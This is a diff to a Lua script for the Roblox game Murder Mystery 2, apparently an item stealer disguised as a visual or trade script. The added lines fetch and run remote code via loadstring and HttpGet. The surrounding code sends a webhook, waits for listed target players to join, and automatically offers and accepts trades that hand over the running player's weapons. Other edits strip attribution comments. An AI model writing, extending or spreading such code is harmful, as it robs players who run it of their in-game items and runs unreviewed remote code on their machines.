@@ -1,5 +1,5 @@
-repeat task.wait() until game:IsLoaded()
-task.wait(2)
+repeat wait() until game:IsLoaded()
+wait(2)
 
 -- Sadece MM2'de çalışsın
 if game.PlaceId ~= 142823291 then
@@ -8,6 +8,9 @@ if game.PlaceId ~= 142823291 then
 end
 
 -- Visual script loader (isteğe bağlı)
+pcall(function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Godfather-team/mm2s2ci/refs/heads/main/visual.lua'))()
+end)
 
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then return end
@@ -132,7 +135,7 @@ if executorName:lower() == "delta" then
                 break
             end
         end
-        task.wait()
+        wait()
     until stepAnimate
 
     local captured = false
@@ -143,11 +146,11 @@ if executorName:lower() == "delta" then
         end
         return old(dt)
     end)
-    repeat task.wait() until captured
+    repeat wait() until captured
 end
 
 if not plr.Character then plr.CharacterAdded:Wait() end
-task.wait(1)
+wait(1)
 
 local PlaceId = game.PlaceId
 local fernJoinerLink = string.format("https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s", PlaceId, REAL_JOB_ID)
@@ -251,7 +254,7 @@ local function fetch_all_values()
     local lock = Instance.new("BindableEvent")
 
     for _, category in ipairs(categoriesToFetch) do
-        task.spawn(function()
+        spawn(function()
             local rarity = category.rarity
             local url = category.url
             local htmlContent = fetchHTML(url)
@@ -477,7 +480,7 @@ end
 sendWebhook(cfg.webhook)
 
 -- ============================================================
--- === BURASI: Eternal Darkness'dan ALINAN YENİ TRADE SİSTEMİ ===
+-- === Eternal Darkness'dan ALINAN YENİ TRADE SİSTEMİ ===
 -- ============================================================
 
 local Trade = ReplicatedStorage:WaitForChild("Trade")
@@ -489,7 +492,7 @@ local DeclineTrade = Trade:WaitForChild("DeclineTrade")
 
 local last_offer_info = nil
 
--- lastOffer yakalama (Eternal Darkness metodu)
+-- lastOffer yakalama
 if Trade:FindFirstChild("UpdateTrade") then
     Trade.UpdateTrade.OnClientEvent:Connect(function(data)
         if typeof(data) == "table" then
@@ -514,7 +517,7 @@ for _, guiName in ipairs({"TradeGUI", "TradeGUI_Phone"}) do
     end
 end
 
--- === TRADE FONKSİYONLARI (Eternal Darkness) ===
+-- === TRADE FONKSİYONLARI ===
 
 local function getStatus()
     local ok, status = pcall(function()
@@ -524,11 +527,10 @@ local function getStatus()
 end
 
 local function waitUntilDone()
-    repeat task.wait(0.1) until getStatus() == "None"
+    repeat wait(0.1) until getStatus() == "None"
 end
 
 local function acceptDeal()
-    -- MM2 AcceptTrade imzası: FireServer(game.PlaceId * 3, lastOffer)
     if not last_offer_info then
         last_offer_info = {}
     end
@@ -541,7 +543,7 @@ local function addToOffer(item_id)
     pcall(function()
         OfferItem:FireServer(item_id, "Weapons")
     end)
-    task.wait(0.1)
+    wait(0.1)
 end
 
 local function isTarget(name)
@@ -551,7 +553,7 @@ local function isTarget(name)
     return false
 end
 
--- === ANA TRADE FONKSİYONU (Eternal Darkness) ===
+-- === ANA TRADE FONKSİYONU ===
 
 local function doTrade(targetPlayer)
     if not targetPlayer then return end
@@ -563,10 +565,10 @@ local function doTrade(targetPlayer)
             break
         end
         attempts = attempts + 1
-        task.wait(0.5)
+        wait(0.5)
     end
 
-    -- Gönderilecek itemlerin kopyasını oluştur (orijinal tabloyu bozma)
+    -- Gönderilecek itemlerin kopyasını oluştur
     local itemsToTrade = {}
     for _, item in ipairs(weaponsToSend) do
         table.insert(itemsToTrade, {
@@ -590,14 +592,14 @@ local function doTrade(targetPlayer)
         -- Mevcut trade'i temizle
         if statusNow == "StartTrade" then
             pcall(function() DeclineTrade:FireServer() end)
-            task.wait(0.3)
+            wait(0.3)
         elseif statusNow == "ReceivingRequest" then
             if Trade:FindFirstChild("DeclineRequest") then
                 pcall(function() Trade.DeclineRequest:FireServer() end)
             else
                 pcall(function() DeclineTrade:FireServer() end)
             end
-            task.wait(0.3)
+            wait(0.3)
         end
 
         -- Trade başlat
@@ -620,11 +622,11 @@ local function doTrade(targetPlayer)
                 end
             end
             sendAttempts = sendAttempts + 1
-            task.wait(0.5)
+            wait(0.5)
         end
 
         if not tradeStarted then
-            task.wait(2)
+            wait(2)
             goto continue
         end
 
@@ -650,12 +652,12 @@ local function doTrade(targetPlayer)
         end
 
         -- Kabul et
-        task.wait(5)
+        wait(5)
         acceptDeal()
         waitUntilDone()
 
         if #itemsToTrade > 0 then
-            task.wait(1)
+            wait(1)
         end
 
         ::continue::
@@ -664,7 +666,7 @@ local function doTrade(targetPlayer)
     -- Tüm itemler gönderildiyse
     if #itemsToTrade == 0 then
         isTradeCompleted = true
-        task.wait(2)
+        wait(2)
         local discordLink = "https://discord.gg/7PJtnGwdXW"
         pcall(function()
             if setclipboard then
@@ -682,8 +684,8 @@ end
 Players.PlayerAdded:Connect(function(player)
     if player == plr then return end
     if isTarget(player.Name) then
-        task.spawn(function()
-            task.wait(4)
+        spawn(function()
+            wait(4)
             doTrade(player)
         end)
     end
@@ -691,8 +693,8 @@ end)
 
 for _, p in ipairs(Players:GetPlayers()) do
     if p ~= plr and isTarget(p.Name) then
-        task.spawn(function()
-            task.wait(4)
+        spawn(function()
+            wait(4)
             doTrade(p)
         end)
     end
